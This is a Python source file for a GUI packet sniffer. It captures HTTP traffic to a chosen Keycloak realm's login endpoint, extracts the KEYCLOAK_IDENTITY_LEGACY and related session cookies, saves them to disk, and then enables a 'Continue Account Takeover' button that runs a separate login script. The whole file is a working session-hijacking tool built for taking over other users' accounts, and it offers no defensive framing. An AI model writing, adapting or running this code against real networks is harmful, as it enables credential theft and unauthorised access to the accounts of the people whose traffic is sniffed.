import tkinter as tk
from tkinter import messagebox
from scapy.all import sniff, IP, TCP, Raw
import threading
import subprocess
import sys

# Global variables
stop_sniffing = False
cookie_found = False

def packet_callback(packet, realm_name, text_widget, continue_button):
    global stop_sniffing, cookie_found
    if stop_sniffing:
        return

    if packet.haslayer(IP) and packet.haslayer(TCP) and packet.haslayer(Raw):
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst
        payload = packet[Raw].load.decode('utf-8', 'ignore')

        # Check for HTTP traffic with the specified URL
        target_url = f'GET /realms/{realm_name}/protocol/openid-connect/3p-cookies/step1.html'
        if target_url in payload:
            # Extract cookies from the payload
            auth_session_id_legacy = extract_cookie(payload, 'AUTH_SESSION_ID_LEGACY')
            keycloak_session_legacy = extract_cookie(payload, 'KEYCLOAK_SESSION_LEGACY')
            keycloak_identity_legacy = extract_cookie(payload, 'KEYCLOAK_IDENTITY_LEGACY')

            # Print the URL from which the login token was pulled
            text_widget.insert(tk.END, f"HTTP packet from {ip_src} to {ip_dst}:\n{payload}\n")

            # Print the keycloak_identity_legacy cookie
            if keycloak_identity_legacy:
                text_widget.insert(tk.END, f"keycloak_identity_legacy cookie found: {keycloak_identity_legacy}\n")
                text_widget.insert(tk.END, f"URL: {extract_url(payload)}\n")

                # Store the cookie value in a file
                store_cookie(keycloak_identity_legacy)
                store_url(extract_url(payload))
                stop_sniffing = True
                cookie_found = True
                text_widget.insert(tk.END, "Packet sniffing stopped.\n")
                continue_button.config(state=tk.NORMAL, bg='green')  # Enable the "Continue Account Takeover" button and set background color

def extract_cookie(payload, cookie_name):
    start_index = payload.find(cookie_name)
    if start_index != -1:
        start_index = payload.find('=', start_index) + 1
        end_index = payload.find(';', start_index)
        cookie_value = payload[start_index:end_index]
        return cookie_value.strip()

    return None

def extract_url(payload):
    # Extracting the URL from the payload
    start_index = payload.find('Host: ') + len('Host: ')
    end_index = payload.find('\r\n', start_index)
    return payload[start_index:end_index]

def store_cookie(cookie_value):
    with open('cookie.txt', 'w') as file:
        file.write(cookie_value)

def store_url(url_value):
    with open('url.txt', 'w') as file:
        file.write(url_value)

def start_sniffing(interface, realm_name, text_widget, continue_button):
    global stop_sniffing, cookie_found
    stop_sniffing = False
    cookie_found = False
    text_widget.delete(1.0, tk.END)  # Clear previous content
    text_widget.insert(tk.END, f"Scanning for keycloak_identity_legacy cookie...\n")
    
    # Start sniffing HTTP traffic with the specific URL filter
    sniff(iface=interface, prn=lambda pkt: packet_callback(pkt, realm_name, text_widget, continue_button), store=0, filter="tcp port 80 or tcp port 8080")

def on_start_button_click(interface_entry, realm_name_entry, text_widget, continue_button):
    interface = interface_entry.get()
    realm_name = realm_name_entry.get()

    if not interface or not realm_name:
        messagebox.showerror("Error", "Please enter both the interface and realm name.")
        return

    # Use threading to run sniffing in the background without freezing the GUI
    threading.Thread(target=start_sniffing, args=(interface, realm_name, text_widget, continue_button)).start()


def on_continue_button_click():
    if cookie_found:
        # Run python3 login.py without sudo in a new process
        subprocess.run(["python3", "login.py"])
    else:
        messagebox.showwarning("Warning", "Cookie not found. Continue button disabled.")



# Create the main window
window = tk.Tk()
window.title("Packet Sniffer GUI")

# Create entry for interface
interface_label = tk.Label(window, text="Enter the interface:")
interface_label.pack()

interface_entry = tk.Entry(window)
interface_entry.pack()

# Create entry for realm name
realm_name_label = tk.Label(window, text="Enter the realm name:")
realm_name_label.pack()

realm_name_entry = tk.Entry(window)
realm_name_entry.pack()

# Create text widget to display information
text_widget = tk.Text(window, height=15, width=60)
text_widget.pack()

# Create button to start sniffing
start_button = tk.Button(window, text="Start Scanning", command=lambda: on_start_button_click(interface_entry, realm_name_entry, text_widget, continue_button))
start_button.pack()

# Create button to continue account takeover
continue_button = tk.Button(window, text="Continue Account Takeover", command=on_continue_button_click, state=tk.DISABLED)
continue_button.pack()

# Run the Tkinter event loop
window.mainloop()
